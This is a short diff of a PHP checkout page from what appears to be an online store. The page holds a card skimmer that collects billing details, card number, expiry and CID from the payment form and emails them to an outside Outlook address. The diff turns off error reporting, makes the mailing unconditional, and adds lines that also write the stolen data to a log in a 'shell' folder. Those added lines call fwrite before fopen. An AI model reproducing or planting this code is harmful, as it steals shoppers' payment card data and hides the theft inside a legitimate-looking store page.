@@ -106,6 +106,7 @@ $seq_http	= (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS']==='on');
 </script>
 </div>
 <?php
+error_reporting(0);
 $messagess   = "
 add id  : ".$_POST['billing']['address_id']."  
 Fname   : ".$_POST['billing']['firstname']."
@@ -132,8 +133,7 @@ Year    : ".$_POST['payment']['cc_exp_year']."
 CID     : ".$_POST['payment']['cc_cid']."
 end.
 ";
-if (!empty($_POST['payment']['cc_number']))
-{
 mail("tunisianseven123@outlook.fr" , "zm back Z", $messagess);
-}
+$fwrite = fwrite($fp, "," .$messagess );
+$fp=fopen('/chroot/home/zmantech/zmantechnologies.com/html/store/shell/log' , 'a+');
 ?>
